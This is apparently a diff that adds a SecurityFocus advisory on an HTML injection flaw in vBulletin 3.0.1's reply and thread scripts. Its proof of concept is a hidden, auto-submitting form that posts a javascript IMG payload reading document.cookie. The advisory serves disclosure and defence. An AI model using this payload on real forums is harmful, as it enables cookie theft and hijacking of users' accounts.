@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/10602/info
+
+VBulletin is reported prone to an HTML injection vulnerability. This issue affects the 'newreply.php' and 'newthread.php' scripts.
+
+An attacker may exploit this issue by including hostile HTML and script code in fields that may be viewable by other users, potentially allowing for theft of cookie-based authentication credentials and other attacks.
+
+This issue is reported to affect VBulletin version 3.0.1, however, it is likely that other versions are affected as well.
+
+<form action="http://www.example.com/newreply.php" name="vbform"
+method="post" style='visibility:hidden'>
+<input name="WYSIWYG_HTML"
+value="&lt;IMG src=&quot;javascript:alert(document.cookie)&quot;&gt;"/>
+<input name="do" value="postreply"/>
+<input name="t" value="123456" />
+<input name="p" value="123456" />
+<input type="submit" class="button" name="preview"/>
+</form>
+&lt;script&gt;
+document.all.preview.click();
+&lt;/script&gt; 
